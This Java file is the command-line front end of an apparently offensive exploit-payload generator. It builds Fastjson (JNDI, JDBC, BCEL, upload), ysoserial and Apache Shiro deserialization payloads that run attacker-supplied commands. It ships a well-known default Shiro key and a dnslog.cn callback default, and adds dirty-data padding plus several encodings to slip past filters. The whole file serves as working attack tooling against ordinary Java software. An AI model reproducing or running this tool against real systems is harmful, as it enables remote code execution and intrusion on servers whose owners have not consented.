package com.ding0x0.run;

import com.ding0x0.Generate;
import com.ding0x0.Payload;
import com.ding0x0.bootstrap.TypeErrorException;
import com.ding0x0.fastjson.GenerateFastjsonPayload;
import com.ding0x0.utils.Code;
import com.ding0x0.utils.Enums;
import com.ding0x0.utils.Util;
import com.ding0x0.yso.Serializer;
import org.apache.commons.cli.*;
import org.fusesource.jansi.Ansi;
import com.ding0x0.utils.Enums.Type;
import com.ding0x0.utils.Enums.FastjsonType;
import com.ding0x0.utils.Enums.Args;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

import static org.fusesource.jansi.Ansi.ansi;

public class App {
    public String help(){
        return "-fastjson <arg>    generate fastjson payload\n" +
                "\t可选: dns -u dns地址\n" +
                "\t\t  jndi -u \n" +
                "\t\t  jdbc -u -p -un 连接用户名 -statement 连接串 （使用https://github.com/fnmsd/MySQL_Fake_Server）\n" +
                "\t\t  upload -lf -rf \n" +
                "\t\t  bcel -lf\n" +
                "\t\n" +
                "-yso <arg>         generate yso payload\n" +
                "\t-c 指定命令\n" +
                "\t-d 脏数据\n" +
                "\t\n" +
                "-gh 查看可用gadget\n" +
                "\n" +
                "-bcel              generate BCEL payload\n" +
                "\t-lf 指定本地文件\n" +
                "\n" +
                "-shiro             generate shiro payload\n" +
                "\t-g 指定gadget\n" +
                "\t-k 指定key\n" +
                "\t-d 脏数据\n" +
                "\t\n" +
                "-be                base64 encode\n" +
                "-d                 dirty data wrapper(default data 2000)\n" +
                "-g                 yso gadget\n" +
                "-c <arg>           command\n" +
                "-k <arg>           key\n" +
                "-lf <arg>          local file path\n" +
                "-p <arg>           port\n" +
                "-rf <arg>          remote file path\n" +
                "\n" +
                "-statement <arg>   statement(default\n" +
                "                   com.mysql.jdbc.interceptors.ServerStatusDiffIntercepto\n" +
                "                   r)\n" +
                "-u <arg>           url or dns\n" +
                "-ue                url encode\n" +
                "-un <arg>          username(default yso_URLDNS_http://xxx.dnslog.cn)\n" +
                "-xe                xml encode\n" +
                "-he\t\t\t\t   html encode\n" +
                "-raw  \t\t\t   raw echo";
    }
//
//    public static void main(String[] args) throws Exception {
//        new App().run(args);
//    }

    public Options init(){
        Options options = new Options();
        OptionGroup optionGroup = new OptionGroup();

        // 可选项
        optionGroup.addOption(new Option("yso", true,"generate yso payload "));
        optionGroup.addOption(new Option("shiro", "generate shiro payload"));
        optionGroup.addOption(new Option("fastjson",true,"generate fastjson payload"));
        optionGroup.addOption(new Option("bcel", "generate fastjson payload"));
        options.addOptionGroup(optionGroup);

        options.addOption("h","help");

        // gadget
        options.addOption("g", true,"yso gadget");
        options.addOption("gh","gadget helper");

        // 其他
        options.addOption("d",true,"dirty data wrapper");

        // 编码
        options.addOption("be","base64 encode");
        options.addOption("ue","url encode");
        options.addOption("xe","xml encode");
        options.addOption("he","html encode");
        options.addOption("raw", "raw echo");

        // payload参数
        options.addOption("k", true,"key(default kPH+bIxk5D2deZiIxcaaaA==)");
        options.addOption("u", true,"url or dns");
        options.addOption("p", true,"port");
        options.addOption("lf",true,"local file path");
        options.addOption("rf",true,"remote file path");
        options.addOption("c",true,"command");
        options.addOption("un",true,"username(default yso_URLDNS_http://xxx.dnslog.cn)");
        options.addOption("statement", true, "statement(default com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor)");
        return options;
    }

    public static ArrayList<String> parserArgs(String args, String type) {
        // 获取到参数数组
        String[] tmp = args.split(" ");
        // 用户输入参数
        ArrayList<String> inputArgs = new ArrayList<String>(Arrays.asList(tmp));
        // 输出参数列表
        ArrayList<String> outputArgs = new ArrayList<>();
        // enum参数列表
        ArrayList<String> typeArgs = null;

        // 遍历enum获取对应的参数列表
        for (FastjsonType types :
                FastjsonType.values()){
            if (types.name().equals(type)){
                typeArgs = FastjsonType.get(type);
                break;
            }
        }

        // 检测类型是否正常
        if (typeArgs == null){
            throw new TypeErrorException("fastjson类型错误");
        }

        // 循环设置参数
        for (String arg :
                typeArgs ) {
            int index = inputArgs.indexOf(arg);
            // 如果找不到用户输入
            if (index == -1){
                if (type.equals("jdbc") && arg.equals("-un")){
                    outputArgs.add("yso_URLDNS_http://xxx.dnslog.cn");
                }else if (type.equals("jdbc") && arg.equals("-statement")){
                    outputArgs.add("com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
                }else {
                    System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a("参数错误，请查看参数列表").reset().toString());
                    System.exit(1);
                }
            }
            outputArgs.add(inputArgs.get(index + 1));
        }
        return outputArgs;
    }

    public void run() throws Exception {
        Scanner scanner = new Scanner(System.in);
        // 输入参数
        String type = null;
        // 判断是否输入过，用来跳过-h后重复输入
        boolean typeFlag = false;
        String fastjsonType = null;
        String args = null;
        boolean fastjsonTypeFlag = false;
        boolean argsFlag = false;

        while (true){
            if (!typeFlag){
                System.out.println("[+] 选择payload类型 -h查看类型 ");
                type = scanner.nextLine();
                typeFlag = true;
            }
            if (type.contains("-h")){
                System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(Type.getAll()).reset().toString());
                continue;
            }

            // 生成 raw payload
            Payload object = null;
            Object rawObj = null;

            switch (type){
                case "fastjson":
                    if (!fastjsonTypeFlag){
                        System.out.println("[+] 选择fastjson payload类型 -h查看类型");
                        fastjsonType = scanner.nextLine();
                        fastjsonTypeFlag = true;
                    }
                    if (fastjsonType.contains("-h")){
                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(FastjsonType.getAll()).reset().toString());
                        continue;
                    }

                    if (!argsFlag){
                        System.out.println("[+] 选择fastjson参数 -h查看选填参数 -hh查看用法");
                        args = scanner.nextLine();
                    }

                    if (fastjsonType.contains("-hh")){
                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(Args.getHelper()).reset().toString());
                        continue;
                    }
                    if (args.contains("-h")){
                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(Args.getAll()).reset().toString());
                        continue;
                    }
                    if (args.length() <2){
                        System.out.println(ansi().eraseScreen().fg(Ansi.Color.RED).a("参数错误，请查看参数列表").reset().toString());
                        System.exit(1);
                    }else {
                        ArrayList<String> funcArgs = parserArgs(args, fastjsonType);
                        Generate generate = new GenerateFastjsonPayload(funcArgs, fastjsonType);
                        object = (Payload) generate.generatePayload();
                    }
                    break;
                case "shiro":
                    break;
                case "yso":
                    break;
                case "bcel":
                    break;
                case "log4j":
                    break;
                default:
                    throw new TypeErrorException("fastjson payload 类型错误");
            }

            // 编码
            System.out.println("[+] 选择payload编码类型 默认为raw");
            String encode = scanner.nextLine();
            rawObj = object.format();
            if (encode.trim().equals("")){
                if (!type.equals("yso")){
                    System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a("[*] 生成成功").reset().toString());
                    System.out.println(ansi().eraseScreen().fg(Ansi.Color.GREEN).a(rawObj).reset().toString());
                }
            }
            break;
        }
    }

    public static void main(String[] args) throws Exception {
        App app = new App();
        app.run();
    }


    public void checkArgs(String[] args) throws Exception {
        Options o = init();
        DefaultParser parser = new DefaultParser();
        CommandLine cmdline = parser.parse(o, args);
        Option[] options = cmdline.getOptions();
        if (options.length == 0 || cmdline.hasOption("h")) {
            System.out.println(help());
            System.exit(1);
        }else if (cmdline.hasOption("gh")){
            List<String> gadgetList = Util.getGadgetList();
            System.out.println("gadget:");
            for (String gadget :
                    gadgetList) {
                System.out.println(gadget);
            }
            System.exit(1);
        }
        Queue<String> code = new LinkedList<>();
        String payloadType = null;
        String gadget = null;
        ArrayList<String> payloadParam = new ArrayList<>();
        ArrayList<String> other = new ArrayList<>();
        for (Option option :
                options) {
            String key = option.getOpt();
            switch (key){
                case "shiro":
                case "fastjson":
                case "yso":
                case "bcel":
                    payloadType = key;
                    break;
                // 编码
                case "ue":
                case "be":
                case "xe":
                case "he":
                case "raw":
                    code.add(key);
                    break;
                case "k":
                case "u":
                case "p":
                case "c":
                case "lf":
                case "statement":
                case "un":
                case "rf":
                    // 加一个payloadType 判断，否则先赋值后会 getOptionValue会抛出异常
                    if (payloadType == null && cmdline.getOptionValue(payloadType).equals("JDBC") && payloadParam.isEmpty()){
                        if (cmdline.getOptionValue("un") == null){
                            payloadParam.add("yso_URLDNS_http://xxx.dnslog.cn");
                        }
                        if (cmdline.getOptionValue("statement") == null){
                            payloadParam.add("com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
                        }
                    }
                    payloadParam.add(cmdline.getOptionValue(key));
                    break;
                case "g":
                    gadget = key;
                    break;
                case "d":
                    other.add(key);
                    break;
            }
        }
        Process process = new Process(code,other,gadget,payloadType,payloadParam,cmdline);
        Payload object = (Payload) process.makeObject();
        Object formatObj = object.format();
        if (payloadType.equals("yso")){
            formatObj = Serializer.serialize(formatObj);
        }
        Object result = formatObj;
        while (!code.isEmpty() && !cmdline.hasOption("raw")){
            String key = code.poll();
            switch (key) {
                case "ue":
                    result = Code.urlEncode((String) result);
                    break;
                case "xe":
                    result = Code.O2XML(result);
                    break;
                case "be":
                    result = Code.base64Encode(result);
                    break;
                case "he":
                    result = Code.HTMLEncode((String) result);
            }
        }
        if (cmdline.hasOption("raw")){
            Serializer.serialize(formatObj, System.out);
        }else {
            System.out.println(result);
        }
    }


    public void run(String[] args) throws Exception {
        new App().checkArgs(args);
    }

}
